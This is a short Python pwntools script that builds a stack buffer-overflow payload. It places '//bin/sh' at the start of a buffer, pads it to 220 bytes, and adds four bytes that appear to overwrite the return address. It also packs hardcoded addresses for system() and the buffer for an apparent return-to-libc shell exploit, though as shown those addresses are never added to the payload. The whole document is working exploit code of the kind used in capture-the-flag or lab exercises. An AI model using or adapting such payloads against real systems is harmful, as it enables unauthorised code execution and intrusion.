from pwn import *



system = p32(0xff62d4cd)
binsh = p32(0xfffeeeb0) # beginning of buffer


payload = ""
payload += "//bin/sh" + "A" * (220-8)
payload += "B" * 4

print payload
